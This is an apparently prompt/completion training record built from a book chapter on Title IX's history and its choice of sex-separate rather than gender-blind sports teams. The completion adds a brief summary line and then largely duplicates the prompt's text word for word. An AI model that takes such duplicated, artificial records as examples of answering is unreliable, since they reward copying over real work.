in society’s response to female athletes and to women’s roles more generally. The Development of Title IX’s Approach to Sex Equality in Sports Title IX emerged from a broader social movement seeking the recognition and vindication of women’s rights. After Congress passed Title VII of the Civil Rights Act of 1964, which banned workplace discrimination on the basis of race, color, religion, sex, or national origin, women’s rights advocates turned their attention to widespread practices of discrimination against girls and women in education. Early drafts of what would become Title IX proposed simply adding “sex” to Title VI of the 1964 Civil Rights Act, which bans race discrimination in all federally funded programs, including education programs. However, in response to extensive testimony in Congress specifically focused on sex discrimination in education, the proposal was redrafted and ultimately enacted as separate legislation. Congressional hearings on the bill barely mentioned sports, focusing instead on the discrimination women faced in gaining admission to collegeand graduate school. At the time, many universities, if they allowed women in graduate programs at all, had quotas limiting the number of places they could fill. The theory was that women were likely to marry and stay home to raise children and should not take slots away from men, who would make better use of their degree.2 To the extent that the topic of sports came up at all in these hearings, it was raised by proponents of Title IX to allay fears that the law would go too far in radically altering male turf. Senator Birch Bayh of Indiana, a leading sponsor of the legislation, mentioned sports only twice during the hearings. The first time was to provide reassurance that the law would not mandate coed football. Senator Peter Dominick of Colorado retorted that he would have had much more fun playing football if it had been coed, prompting chuckles from the Senate gallery. The only other time the subject was mentioned was to reassure members of Congress that Title IX would not require coed locker rooms and would allow personal privacy to be preserved.3 Whatever ambivalence surrounding the law’s coverage of sports was present at the time was overshadowed by a general consensus on the need to expand women’s access to educational opportunities. The final version of the law was enacted as part of an education funding law in 1972—the same year that Congress endorsed the Equal Rights Amendment, which would later die a protracted death in the state ratification process.4 The core provision of Title IX is a broad and general ban on sex discrimination. The heart of the law says simply: “No person in the United States shall, on the basis of sex, be excluded from participation in, be denied the benefits of, or be subjected to discrimination under any education program or activity receiving federal financial assistance. . . .”5 As with other similarly broad statutes, “discrimination” is a loaded and highly malleable term. It requires interpretation, and the consensus that the term generates masks what are often sharp conflicts about its meaning. Today, almost everyone agrees that discrimination is wrong, but questions about what that means, the implications of remedying it, and who will bear the costs have historically been the subject of deep social conflict. Title IX is no exception. The rosy glow of consensus quickly gave way to bitter disputes over the law’s application to sports. Although Senator Bayh’s oblique remarks about football were intended to reassure skeptics that the law would not be too far-reaching, they implicitly reflected an expectation that the law would apply to athletics. The sports establishment soon rallied to try to cabin the law’s implications for intercollegiate sports. The National Collegiate Athletic Association (NCAA) was a leader in this effort. With the group’s support, Senator John Tower of Texas attempted to amend Title IX in the early 1970s. Senator Tower first introduced a bill that would have exempted intercollegiate sports entirely. When that effort ran into opposition, he sponsored an alternative proposal to exempt “intercollegiate athletic activity to the extent that such activity does or may provide gross receipts or donations to the institution necessary to support that activity.”6 The Tower Amendment passed in the Senate, but when the Education Amendments of 1974 reached the joint House-Senate conference, the conference committee replaced it with a compromise provision that basically evaded the tough questions about how Title IX would apply to sports. Proposed by Senator Jacob Javits of New York and henceforth known as the Javits Amendment, the compromise delegated authority to the federal enforcing agency, then the Department of Health, Education, and Welfare (HEW), to issue regulations for implementing Title IX that included “with respect to intercollegiate athletics reasonable provisions considering the nature of particular sports.”7 The Javits Amendment recognized that Title IX should allow for differences among individual sports, with football and its mega-budgets and squad sizes being the elephant in the room, but it implicitly rejected the notion that a sport’s ability to raise revenue should categorically exempt it from Title IX. Still, the compromise left the details—large and small—to be worked out at another level of government. During the second half of the 1970s, the battle over Title IX shifted from Congress to federal regulators and eventually to the courts. Even before the Javits Amendment turned over the job to HEW, the agency’s Office for Civil Rights had already begun struggling with the difficult question of how to craft antidiscrimination standards to fit intercollegiate athletics. Lawyers at HEW quickly realized that the desegregation model for enforcing Title VI, which covers race discrimination in federally funded schools, could not simply be replicated in Title IX.8 They recognized that competitive sport was a particularly thorny area for developing measures of gender equality. In the vast majority of settings in which antidiscrimination laws apply, including employment and voting rights, assimilation and gender neutrality are the guiding norms and goals shared by the law’s supporters.9 For example, although American workplaces continue to have a significant degree of de facto sex gender segregation, both vertically and horizontally, employment discrimination laws aspire to dismantle this segregation and create a genderblind opportunity structure.10 In the world of sports, however, it is much less clear that integration is or should be the primary goal of Title IX. As was true in 1972, sex segregation remains the norm for sports competition today, and there is no consensus, even among Title IX’s strongest proponents, that the law should aspire otherwise. When HEW was developing its proposal for Title IX regulations, some stakeholders argued for sex integration as the measure of equality. Among them, some women’s rights advocates acknowledged that temporarily separate sports programs for women might be necessary as a type of affirmative action but pushed for the ultimate goal of having men and women compete for a spot on the same team. Other stakeholders who supported sex integration, however, did so as a way of preserving the status quo. For example, during early debates over the Title IX regulations, some male athletic directors argued that colleges should be able to satisfy Title IX simply by opening tryouts to men and women, even if the end result was all-male teams with no additional female participation.11 Supporters of separate women’s sports programs vigorously resisted such proposals, arguing for a more substantive measure of nondiscrimination that would ensure meaningful opportunities to participate. The debate drove a wedge between women’s rights advocates over how best to achieve sex equality in sports. The feminist group most critical of sex segregation in sports, the National Organization for Women (NOW), argued that “separate but equal” was an inappropriate permanent baseline for sports, as for other areas of public life. But NOW acknowledged that sex-separate teams might be a necessary interim measure until the gap in training and experience closed and women could meaningfully compete with men. Other advocates of women’s sports were more comfortable with sex separation as a lasting baseline and pushed for measures of equality within sexseparate programs. The Association for Intercollegiate Athletics for Women (AIAW), for example, argued for separate teams for all men’s and women’s sports, with proportionate funding.12 The organization made the case that giving women control over their own resources would allow them to develop their own model of sports rather than simply replicate what men had designed for themselves. Separation would allow women broader opportunities in sport instead of limiting them to the sports selected for men. More important, the group hoped that women’s programs might avoid the commercialism that was already taking hold in men’s programs, and emphasized broad participation, instead of spending vast sums on a few elite athletes.13 The AIAW represented female physical educators, the vast majority of whom would have been pleased with separate teams, as long as they had sufficient resources to succeed. Sifting through the arguments in 1973, HEW’s Office for Civil Rights initially considered two very different approaches: (1) opening up team tryouts to all athletes, male and female; or (2) keeping sex-separate programs but developing measures of equality to ensure equal opportunities.14 By 1974, when it issued draft regulations, HEW had rejected the first option. Instead, the draft regulations issued for public “notice and comment” required educational institutions to annually gauge the athletic interests of their student bodies and to engage in affirmative action to increase women’s opportunities in sports.15 The “affirmative efforts” requirement included providing women with training and support and encouraging them to take advantage of existing athletic opportunities. The agency received nearly ten thousand sets of written comments on the draft regulations, prompting Secretary Casper Weinberger to observe, with a tinge of sarcasm, that “the most important issue in the United States today is intercollegiate athletics.”16 Various interest groups opposed the draft regulations, including the NCAA, which feared the regulations would have the effect of taking resources away from men’s sports. After sorting through the comments, HEW made substantial revisions before issuing final regulations in 1975. The Javits Amendment had given Congress a window of opportunity to block the regulations if it disapproved of them. Backed by the NCAA and the big-time football schools, members of Congress introduced several resolutions to stop the regulations from taking effect. Supporters fought back in congressional hearings on the regulations, putting forward extensive evidence on the extent and magnitude of sex discrimination in intercollegiate athletics. Among the many examples, Ohio State University was noted for spending 1,300 times more money on male than on female athletes.17 The effort to disapprove the regulations ultimately failed, and they went into effect in the summer of 1975.18 They allowed for a three-year grace period for athletic programs, requiring full compliance by 1978. The deadline passed with very little effort toward compliance, but there was much continuing dialogue about exactly what the regulations required. Title IX’s Baseline: Separation, Not Integration The final Title IX regulations reflect the determination that gender neutrality in team tryouts is insufficient to provide real equality for women in sport. And yet, the structure of the regulation on equal athletic opportunity is itself interesting, and reflects some ambivalence about sex segregation in sports even as it rejects assimilation as the full measure of equality. The key regulation begins with a strong statement endorsing gender integration in sports. The first section states: (a) General. No persons shall, on the basis of sex, be excluded from participation in, be denied the benefits of, be treated differently from another person or otherwise be discriminated against in any interscholastic, intercollegiate, club or intramural athletics offered by a recipient, and no recipient shall provide any such athletics separately on such basis. 19 After this strong statement endorsing sex integration in sports programs, the next part of the regulation reads like a jarring reversal: (b) Separate Teams. Notwithstanding the requirements of paragraph (a) of this section, a recipient may operate or sponsor separate teams for members of each sex where selection for such teams is based upon competitive skill or the activity involved is a contact sport.20 Although the structure of the regulation suggests that integration is the general rule, with sex separation being the exception, in reality the reverse is true. At least at the varsity level, team selection is always based on competitive skill, which means that sex-separate teams are allowed in both contact and noncontact sports. If sex separation is the exception, then it is the exception that swallows the rule. By using the term “may” rather than “shall,” the Title IX regulation itself does not require separate athletic offerings for men and women. However, by permitting sex-separate programs under most circumstances, the Title IX regulations left intact the reality of sex-segregated sports. Moreover, it is not at all clear that a gender-blind team selection process would satisfy the regulation’s commitment to equal athletic opportunity. A separate requirement in a later provision of the regulation, discussed in depth in chapter 3, requires equal athletic opportunity in the selection of sports and levels of competition so as to effectively accommodate the interests and abilities of members of both sexes.21 In its comments on this part of the regulations, HEW explained that this provision may effectively require schools to provide separate teams for male and female athletes. In order to accommodate the interests and abilities of women, the agency advised, “an institution would be required to provide separate teams for men and women in situations where the provision of only one team would not ‘accommodate the interests and abilities of both sexes.’”22 Whether merely permitted or actually required by Title IX, sex-separate teams for women have remained the norm in the post–Title IX era. This reality fundamentally shapes the rest of Title IX’s approach to equal athletic opportunity. Within the baseline of separation, there is some allowance in the Title IX regulations for integration rights, a topic taken up in the next chapter, but coed sports are the exception and not the rule. This has generated a longstanding debate about whether sex-separate teams can ever be truly equal and whether separation is the best baseline under Title IX. A (Locker) Room of One’s Own: The Case for Separation The case for having a baseline of separate sports for men and women dates back to the pre–Title IX years, when women athletic administrators were in the early stages of developing women’s sports. In 1963, female athletic administrators attending the NCAA annual convention asked the NCAA not to allow women to compete on men’s teams.23 They had several rationales, including a fear that women would be hurt in competition with men, a concern about a potential talent drain from women’s sports, and a desire to prevent women’s programs from developing along the same lines as men’s sports, with their scandals and commercialism. In addition, the push for maintaining separate women’s programs was based on a desire to maintain control over women’s sports by female educators, who placed a different, more educational value on sports than the administrators who ran men’s sports. Early judicial rationales for sex separation in sports emphasized physical differences and the potential for women to be injured in coed competition. However, as such rationales came to be viewed as chauvinistic and inconsistent with emerging legal norms on gender discrimination, the dominant rationale shifted to an emphasis on protecting women’s increasing athletic opportunities from male encroachment. An important test case arose in 1980. It involved a talented eleven-year-old girl, Karen O’Connor, who wanted to try out for the sixth-grade boys’ basketball team. Karen had played basketball with boys in youth sports leagues since she was seven years old. Although the junior high school she attended offered both girls’ and boys’ basketball teams, Karen believed that only the boys’ team could offer her the level of competition that would enable her to develop her skills. When school officials insisted that she try out for the girls’ team or not compete at all, as required by the school’s athletic conference, Karen’s parents sued on her behalf, bringing claims under both Title IX and the equal protection clause.24 Karen’s ability to compete with boys on the basketball court was not the issue. As the court of appeals acknowledged, “a professional basketball coach who observed her play rated her ability as equal to or better than a female high school sophomore and equal to that of a male eighth-grade player.”25 Nevertheless, the appellate court reversed the lower court’s ruling that she had a right to try out for the boys’ team. Emphasizing that the teams were equal except for the level of play by the athletes themselves, the court ruled that the school district’s decision to maintain separate girls and boys teams was justified by the important objective of increasing girls’ overall participation in sports.26 U.S. Supreme Court Justice John Paul Stevens, who sided with the school district in an earlier proceeding in the case, made a similar point:27 In my opinion, the question whether the discrimination is justified cannot depend entirely on whether the girls’ program will offer Karen the opportunities that are equal in all respects to the advantages she would gain from the higher level of competition in the boys’ program. The answer must depend on whether it is permissible for the defendants to structure their athletic programs by using sex as one criterion for eligibility. If the classification is reasonable in substantially all of its applications, I do not believe that the general rule can be said to be unconstitutional simply because it appears arbitrary in an individual case.28 Justice Stevens’s remarks reflect the tension between a model of equality that prioritizes the goal of advancing the position of a social group and one geared toward ensuring that individuals are not penalized by their social group membership. His position, and that of the appellate court, prioritizes the rights of the social group, women, to maximize their overall athletic opportunities. Under this reasoning, if team selection were made on a gender-blind, individualized basis, male athletes would likely dominate sports teams, leaving fewer opportunities for women. Even if men could somehow be kept off of women’s teams, there would still be a significant cost to women’s sports. The talent drain from having the best female athletes play on “men’s” teams could slow the development of women’s sports, depriving other women of the chance to compete against the best women in the game. Interest in women’s sports might develop more slowly as a result, with women’s teams being further stigmatized for including only those women not good enough to get onto the “men’s” team. The more recent controversy over the teen golf phenomenon Michelle Wie and her effort to play in the men’s league shows that the same set of concerns still arises when elite women athletes seek to leave the women’s game to compete with men. When Wie took the game by storm as a fifteen-yearold, generating the kind of public attention and media spotlight rarely seen in women’s golf, many supporters of the Ladies Professional Golf Association (LPGA) feared that her determination to play in the Professional Golfers’ Association (PGA) would hurt the women’s league. As one sports writer described the predicament, “No wonder the LPGA is nervous about Wie. It cannot afford to lose golf ’s starlet to a man’s world.”29 Wie’s foray into the men’s game generated a great deal of press attention, but her fame quickly faded when she did not excel in that venue. Some perceived it as a slight to the LPGA, in which Wie had yet to distinguish herself as a champion comparable to the likes of Annika Sorenstam. One commentator lamented, “Michelle Wie would generate more attention for playing poorly at men’s events than Sorenstam did for winning against women. Which, of course, is a shame.”30 By choosing to compete against men, elite female athletes may send the message that competition with men is more worthy of public attention and accolades than women’s sports. The O’Connor case typifies the rationales courts use to justify sex segregation in sports. The Sixth Circuit Court of Appeals used similar reasoning in another watershed case that addressed the constitutionality of sex separation in sports, this time overturning a lower-court ruling that Title IX’s allowance for separate teams in contact sports violated the equal protection clause of the U.S. Constitution. The Sixth Circuit ruled that a school district has the discretion to offer coed opportunities where doing so furthers equal opportunity for girls, as for example where there is no comparable girls’ team in the sport. However, the court rejected the argument that Title IX’s allowance of sex-separate opportunities violates the equal protection clause. The court took a more substantive approach to equality, explaining, “[w]hen males and females are not in fact similarly situated and when the law is blind to those differences, there may be as much a denial of equality as when a difference is created which does not exist.”31 The court continued, expressing its concern for promoting real opportunities for girls: When considering the constitutionality of Title IX and its regulations, a blanket requirement of one team at each age level might result in male dominance of all teams and cause a return to pre-Title IX conditions, a result completely at variance with the statute’s purpose. It is desirable to maximize the opportunities for individual women, but a requirement that boys play only on boys’ teams while girls may compete either with the boys or in an all-girls’ program (as they wish) might have a similar undesirable effect on the fledgling women’s athletic programs; women’s athletics may be significantly harmed if the best female competition is lost to the boys’ program.32 Like Justice Stevens in his opinion in the O’Connor case, this court viewed Title IX as protecting the rights of women as a group over the occasionally conflicting interests of exceptional female athletes.33 There is, of course, a significant cost to this model of equality that emphasizes what is best for women as a group. Exceptionally gifted athletes like Karen O’Connor who are able to compete with male athletes may be worse off because they are denied the chance to play at the highest level. Karen O’Connor felt so strongly about her preference for competing with boys that, after losing in court, she chose not to try out for the girls’ team and to forgo playing basketball at the school.34 Limiting exceptional female athletes to competition on women’s teams may keep the very best female athletes from developing to their full potential, depriving the public of seeing just how good top female athletes can become. Faced with this tension, Title IX sides with a group-based vision of equality, emphasizing the goal of developing strong women’s sports programs that expand women’s overall opportunities. As Justice Stevens explained, “without a gender-based classification . . . there would be a substantial risk that boys would dominate the girls’ program and deny them an equal opportunity to compete in interscholastic events.”35 Such an approach would leave many girls and women shut out of varsity sports entirely, relegated to second-tier sports competition. In such a world, there would be too few female athletes competing to shift cultural gender norms. The few women competing at high levels would be perceived as tokens and as exceptional female athletes who are recognized because of their differences from other women, thereby ultimately reinforcing the norm of female athletic inferiority rather than contesting it. As Michael Messner, a scholar of sport and sociology, has warned, mixed-sex competition under the guise of “equal opportunity” and liberal feminism “is likely to become a new means of solidifying the ideological hegemony of male superiority” by “provid[ing] support for the ideology of meritocracy while at the same time offering incontrovertible evidence of the ‘natural’ differences between males and females.”36 In other words, a shift from sex separation to a gender-blind selection process would send the message that men have “earned” their privileged status in sports, while reinforcing the notion that few women belong in sport, and only if they can compete on men’s terms. Indeed, in the battle over the meaning of equal opportunity in sports, the gender-blind approach has often been a strategy for thwarting more substantive measures of equality. When a class of female athletes sued Temple University in the 1980s for not allocating enough funding, resources, or opportunities for women to play varsity sports, Temple responded that its varsity men’s teams just happened to be filled by men. In actuality, Temple claimed, the teams are open to any athlete good enough to make them, male or female. As a result, Temple argued, the funding, resources, and opportunities provided to athletes on teams filled by men should count as programs that support female athletes, as well. This argument did not prevail, and the female athletes who brought the case eventually won an important settlement requiring Temple to put more resources into its women’s sports program. More recently, Florida’s state high school athletic association used a similar argument in attempting to defend a 20 percent schedule reduction for varsity sports that exempted football. Classifying football as a coed sport since girls as well as boys could try out, the association argued that the schedule cuts were gender-neutral. It later backed down from this argument when parents of female athletes filed a Title IX lawsuit, alleging that the exemption of football left girls bearing the brunt of the cuts. The case was settled when the association agreed to rescind the schedule changes.37 In addition to protecting large numbers of competitive sports opportunities for women, the case for sex separation also considers how best to structure sport to make it an empowering experience for girls and women. Many girls and women prefer having their own teams, where they are less likely to feel threatened, inadequate, or unwelcome.38 Research on coed sports suggests that male athletes tend to take over, keeping women from playing or fully developing their skills and confidence.39 The sports anthropologist Faye Linda Wachs explains that “when girls attempt to join boys in sports, they often find themselves ignored, placed in devalued positions (positions to which the ball is rarely hit), and they do not receive the same instruction and encouragement as the boys.”40 Her study of adult coed softball found that male athletes used a number of strategies for limiting women’s participation, including “positional segregation,” that is, the “gendering” of field positions and the placement of players into positions by gender. Through this tactic, women were more likely to be placed in “helper” positions where they would pass the ball to others, rather than make the play themselves. Another strategy identified in the study was “the switch,” in which male players temporarily switched positions with female players in order to make a play. For example, a male outfielder would run into a female player’s territory and shout, “I got it,” even if the female player was well positioned to catch the ball. Wachs explains how these kinds of practices become a self-fulfilling prophecy. Anticipating the “switch,” a female athlete will play more tentatively, unsure of whether to step in and make the play or leave it to a male colleague.","completion":"The text discusses the dominant principle in modern antidiscrimination law, which is treating all individuals as individuals without reference to their social group.

The dominant principle in modern antidiscrimination law is that all persons should be treated as individuals, without reference to their status as members of a social group. In American law, this translates into a principle of color blindness when we’re speaking about racial equality and gender blindness when the focus is on discrimination against women. Civil rights laws on workplace equality, for example, require employers to use gender-neutral hiring criteria, with few exceptions. Once Title VII of the Civil Rights Act of 1964 went into effect, employers could no longer advertise positions for “women’s jobs” or “men’s jobs.” Instead, the law requires employers to consider men and women together for the same positions—unless the job fits into a narrow category of exceptions where sex is a “bona fide occupational qualification” for performing the job. Men have an equal right to be considered for secretarial positions, just as women can compete for jobs in law enforcement. Whether or not such gender-blind criteria actually produce a diverse mix of men and women throughout the workforce is not the law’s primary concern. Title VII is a quintessentially liberal feminist law, promising a gender-neutral process, not equal results. Title IX’s approach is markedly different from this baseline. As any college or high school sports fan knows, gender blindness is not the rule in competitive sports. Men and women generally do not compete against each other for the same sports opportunities. Title IX left the sex-separate structure of sports largely intact and opted for more substantive measures of equal opportunity rather than a rule of gender blindness. Where Title IX has had the greatest impact, in high school and college varsity sports participation, separation by sex is the rule rather than the exception. Title IX’s allowance for sex separation has facilitated a legal approach that emphasizes results over process and actual opportunities for girls and women over a more formal gender neutrality. However, the law also leaves intact a structure in which women’s sports are too often marginalized as secondary to men’s games, a poor stepsister to the “real” varsity programs.The question of how to structure sport so that it fully includes and values women raises what is known among feminist legal scholars as the dilemma of difference. If women as a group are not similarly situated to men with respect to sports as they are currently played, how can sex-discrimination law best secure equality? Should it ignore gender differences, promote a gender-blind structure, and call it equality if schools have open tryouts for each sport? In this model, the best athlete, male or female, would make the team with no special dispensation for an athlete’s sex. Alternatively, should Title IX take a gender-conscious approach that acknowledges gender difference and makes sure that women have enough opportunities to play sports compared to the number of men’s opportunities? The Dilemma: Separation or Integration? Neither model is costless. Shifting to a framework that offers coed opportunities for all athletes with no attention to gender could potentially wipe out the biggest gains Title IX has produced: the burgeoning numbers of girls and women who participate in competitive school sports. With genderblind team selection and competition, the majority of female athletes could well be relegated to second-tier teams or club and intramural games with only token representation at the varsity level. For many girls and women, such a shift would offer fewer paths to the success and status that so many female athletes have achieved under Title IX. Sport as a path to empowerment would become much narrower for most women, if not closed off completely. Although some individual female athletes might be better off with coed teams because of their ability to excel in competition with male athletes, women as a group would likely face diminished opportunities to play sports at the most elite levels. On the other hand, accommodating gender difference has its costs, too. It reinforces an ideology that has historically been used to justify the outright denial of sports opportunities to women and, more recently, to place a lower value on women’s sports. Having separate men’s and women’s teams risks sending the message that women are inherently lesser athletes. The existence of sex-segregated programs risks identifying female athletes as the second-class citizens of sport. It also sacrifices whatever benefits might be gained by having men and women, and boys and girls, compete with and against one another and the potential transformation in gender relations that might result. As the feminist sport historian Jennifer Hargreaves explains the dilemma, separatism can increase women’s control over sport, mobilize women to fight for equal resources, and enable them to participate in sports free from male domination, but it also re-creates social gender divisions and can exaggerate sexism, with the message that biological sex, rather than culture, defines athleticism.1 This is the classic dilemma of difference, leaving advocates for gender equality damned if they ignore gender and damned if they don’t. Title IX negotiates this terrain with a flexible and pragmatic approach. As a starting point, Title IX allows schools to offer separate competitive teams for men and women. But this baseline can be altered in narrow circumstances recognized by Title IX and, in some cases, the U.S. Constitution’s equal protection clause. The result is that individual athletes have a right to try out for an oppositesex team, but only if they meet certain criteria—criteria that strongly favor tryout rights for women over those for men. In this legal regime, gender separation is the norm, integration the exception. This chapter explores how Title IX navigates the tricky terrain of gender separation and assimilation in sports. It concludes that, although critiques of sex segregation in sport deserve our attention, Title IX has done a relatively good job of forging a pragmatic approach to structuring sports opportunities for girls and women. In forsaking gender blindness for a more gender-conscious, result-oriented model, Title IX has chosen substantive equality over formal equality. This choice has created the potential for expanding girls’ and women’s sports participation and inciting broad-based cultural transformation in society’s response to female athletes and to women’s roles more generally. The Development of Title IX’s Approach to Sex Equality in Sports Title IX emerged from a broader social movement seeking the recognition and vindication of women’s rights. After Congress passed Title VII of the Civil Rights Act of 1964, which banned workplace discrimination on the basis of race, color, religion, sex, or national origin, women’s rights advocates turned their attention to widespread practices of discrimination against girls and women in education. Early drafts of what would become Title IX proposed simply adding “sex” to Title VI of the 1964 Civil Rights Act, which bans race discrimination in all federally funded programs, including education programs. However, in response to extensive testimony in Congress specifically focused on sex discrimination in education, the proposal was redrafted and ultimately enacted as separate legislation. Congressional hearings on the bill barely mentioned sports, focusing instead on the discrimination women faced in gaining admission to collegeand graduate school. At the time, many universities, if they allowed women in graduate programs at all, had quotas limiting the number of places they could fill. The theory was that women were likely to marry and stay home to raise children and should not take slots away from men, who would make better use of their degree.2 To the extent that the topic of sports came up at all in these hearings, it was raised by proponents of Title IX to allay fears that the law would go too far in radically altering male turf. Senator Birch Bayh of Indiana, a leading sponsor of the legislation, mentioned sports only twice during the hearings. The first time was to provide reassurance that the law would not mandate coed football. Senator Peter Dominick of Colorado retorted that he would have had much more fun playing football if it had been coed, prompting chuckles from the Senate gallery. The only other time the subject was mentioned was to reassure members of Congress that Title IX would not require coed locker rooms and would allow personal privacy to be preserved.3 Whatever ambivalence surrounding the law’s coverage of sports was present at the time was overshadowed by a general consensus on the need to expand women’s access to educational opportunities. The final version of the law was enacted as part of an education funding law in 1972—the same year that Congress endorsed the Equal Rights Amendment, which would later die a protracted death in the state ratification process.4 The core provision of Title IX is a broad and general ban on sex discrimination. The heart of the law says simply: “No person in the United States shall, on the basis of sex, be excluded from participation in, be denied the benefits of, or be subjected to discrimination under any education program or activity receiving federal financial assistance. . . .”5 As with other similarly broad statutes, “discrimination” is a loaded and highly malleable term. It requires interpretation, and the consensus that the term generates masks what are often sharp conflicts about its meaning. Today, almost everyone agrees that discrimination is wrong, but questions about what that means, the implications of remedying it, and who will bear the costs have historically been the subject of deep social conflict. Title IX is no exception. The rosy glow of consensus quickly gave way to bitter disputes over the law’s application to sports. Although Senator Bayh’s oblique remarks about football were intended to reassure skeptics that the law would not be too far-reaching, they implicitly reflected an expectation that the law would apply to athletics. The sports establishment soon rallied to try to cabin the law’s implications for intercollegiate sports. The National Collegiate Athletic Association (NCAA) was a leader in this effort. With the group’s support, Senator John Tower of Texas attempted to amend Title IX in the early 1970s. Senator Tower first introduced a bill that would have exempted intercollegiate sports entirely. When that effort ran into opposition, he sponsored an alternative proposal to exempt “intercollegiate athletic activity to the extent that such activity does or may provide gross receipts or donations to the institution necessary to support that activity.”6 The Tower Amendment passed in the Senate, but when the Education Amendments of 1974 reached the joint House-Senate conference, the conference committee replaced it with a compromise provision that basically evaded the tough questions about how Title IX would apply to sports. Proposed by Senator Jacob Javits of New York and henceforth known as the Javits Amendment, the compromise delegated authority to the federal enforcing agency, then the Department of Health, Education, and Welfare (HEW), to issue regulations for implementing Title IX that included “with respect to intercollegiate athletics reasonable provisions considering the nature of particular sports.”7 The Javits Amendment recognized that Title IX should allow for differences among individual sports, with football and its mega-budgets and squad sizes being the elephant in the room, but it implicitly rejected the notion that a sport’s ability to raise revenue should categorically exempt it from Title IX. Still, the compromise left the details—large and small—to be worked out at another level of government. During the second half of the 1970s, the battle over Title IX shifted from Congress to federal regulators and eventually to the courts. Even before the Javits Amendment turned over the job to HEW, the agency’s Office for Civil Rights had already begun struggling with the difficult question of how to craft antidiscrimination standards to fit intercollegiate athletics. Lawyers at HEW quickly realized that the desegregation model for enforcing Title VI, which covers race discrimination in federally funded schools, could not simply be replicated in Title IX.8 They recognized that competitive sport was a particularly thorny area for developing measures of gender equality. In the vast majority of settings in which antidiscrimination laws apply, including employment and voting rights, assimilation and gender neutrality are the guiding norms and goals shared by the law’s supporters.9 For example, although American workplaces continue to have a significant degree of de facto sex gender segregation, both vertically and horizontally, employment discrimination laws aspire to dismantle this segregation and create a genderblind opportunity structure.10 In the world of sports, however, it is much less clear that integration is or should be the primary goal of Title IX. As was true in 1972, sex segregation remains the norm for sports competition today, and there is no consensus, even among Title IX’s strongest proponents, that the law should aspire otherwise. When HEW was developing its proposal for Title IX regulations, some stakeholders argued for sex integration as the measure of equality. Among them, some women’s rights advocates acknowledged that temporarily separate sports programs for women might be necessary as a type of affirmative action but pushed for the ultimate goal of having men and women compete for a spot on the same team. Other stakeholders who supported sex integration, however, did so as a way of preserving the status quo. For example, during early debates over the Title IX regulations, some male athletic directors argued that colleges should be able to satisfy Title IX simply by opening tryouts to men and women, even if the end result was all-male teams with no additional female participation.11 Supporters of separate women’s sports programs vigorously resisted such proposals, arguing for a more substantive measure of nondiscrimination that would ensure meaningful opportunities to participate. The debate drove a wedge between women’s rights advocates over how best to achieve sex equality in sports. The feminist group most critical of sex segregation in sports, the National Organization for Women (NOW), argued that “separate but equal” was an inappropriate permanent baseline for sports, as for other areas of public life. But NOW acknowledged that sex-separate teams might be a necessary interim measure until the gap in training and experience closed and women could meaningfully compete with men. Other advocates of women’s sports were more comfortable with sex separation as a lasting baseline and pushed for measures of equality within sexseparate programs. The Association for Intercollegiate Athletics for Women (AIAW), for example, argued for separate teams for all men’s and women’s sports, with proportionate funding.12 The organization made the case that giving women control over their own resources would allow them to develop their own model of sports rather than simply replicate what men had designed for themselves. Separation would allow women broader opportunities in sport instead of limiting them to the sports selected for men. More important, the group hoped that women’s programs might avoid the commercialism that was already taking hold in men’s programs, and emphasized broad participation, instead of spending vast sums on a few elite athletes.13 The AIAW represented female physical educators, the vast majority of whom would have been pleased with separate teams, as long as they had sufficient resources to succeed. Sifting through the arguments in 1973, HEW’s Office for Civil Rights initially considered two very different approaches: (1) opening up team tryouts to all athletes, male and female; or (2) keeping sex-separate programs but developing measures of equality to ensure equal opportunities.14 By 1974, when it issued draft regulations, HEW had rejected the first option. Instead, the draft regulations issued for public “notice and comment” required educational institutions to annually gauge the athletic interests of their student bodies and to engage in affirmative action to increase women’s opportunities in sports.15 The “affirmative efforts” requirement included providing women with training and support and encouraging them to take advantage of existing athletic opportunities. The agency received nearly ten thousand sets of written comments on the draft regulations, prompting Secretary Casper Weinberger to observe, with a tinge of sarcasm, that “the most important issue in the United States today is intercollegiate athletics.”16 Various interest groups opposed the draft regulations, including the NCAA, which feared the regulations would have the effect of taking resources away from men’s sports. After sorting through the comments, HEW made substantial revisions before issuing final regulations in 1975. The Javits Amendment had given Congress a window of opportunity to block the regulations if it disapproved of them. Backed by the NCAA and the big-time football schools, members of Congress introduced several resolutions to stop the regulations from taking effect. Supporters fought back in congressional hearings on the regulations, putting forward extensive evidence on the extent and magnitude of sex discrimination in intercollegiate athletics. Among the many examples, Ohio State University was noted for spending 1,300 times more money on male than on female athletes.17 The effort to disapprove the regulations ultimately failed, and they went into effect in the summer of 1975.18 They allowed for a three-year grace period for athletic programs, requiring full compliance by 1978. The deadline passed with very little effort toward compliance, but there was much continuing dialogue about exactly what the regulations required. Title IX’s Baseline: Separation, Not Integration The final Title IX regulations reflect the determination that gender neutrality in team tryouts is insufficient to provide real equality for women in sport. And yet, the structure of the regulation on equal athletic opportunity is itself interesting, and reflects some ambivalence about sex segregation in sports even as it rejects assimilation as the full measure of equality. The key regulation begins with a strong statement endorsing gender integration in sports. The first section states: (a) General. No persons shall, on the basis of sex, be excluded from participation in, be denied the benefits of, be treated differently from another person or otherwise be discriminated against in any interscholastic, intercollegiate, club or intramural athletics offered by a recipient, and no recipient shall provide any such athletics separately on such basis. 19 After this strong statement endorsing sex integration in sports programs, the next part of the regulation reads like a jarring reversal: (b) Separate Teams. Notwithstanding the requirements of paragraph (a) of this section, a recipient may operate or sponsor separate teams for members of each sex where selection for such teams is based upon competitive skill or the activity involved is a contact sport.20 Although the structure of the regulation suggests that integration is the general rule, with sex separation being the exception, in reality the reverse is true. At least at the varsity level, team selection is always based on competitive skill, which means that sex-separate teams are allowed in both contact and noncontact sports. If sex separation is the exception, then it is the exception that swallows the rule. By using the term “may” rather than “shall,” the Title IX regulation itself does not require separate athletic offerings for men and women. However, by permitting sex-separate programs under most circumstances, the Title IX regulations left intact the reality of sex-segregated sports. Moreover, it is not at all clear that a gender-blind team selection process would satisfy the regulation’s commitment to equal athletic opportunity. A separate requirement in a later provision of the regulation, discussed in depth in chapter 3, requires equal athletic opportunity in the selection of sports and levels of competition so as to effectively accommodate the interests and abilities of members of both sexes.21 In its comments on this part of the regulations, HEW explained that this provision may effectively require schools to provide separate teams for male and female athletes. In order to accommodate the interests and abilities of women, the agency advised, “an institution would be required to provide separate teams for men and women in situations where the provision of only one team would not ‘accommodate the interests and abilities of both sexes.’”22 Whether merely permitted or actually required by Title IX, sex-separate teams for women have remained the norm in the post–Title IX era. This reality fundamentally shapes the rest of Title IX’s approach to equal athletic opportunity. Within the baseline of separation, there is some allowance in the Title IX regulations for integration rights, a topic taken up in the next chapter, but coed sports are the exception and not the rule. This has generated a longstanding debate about whether sex-separate teams can 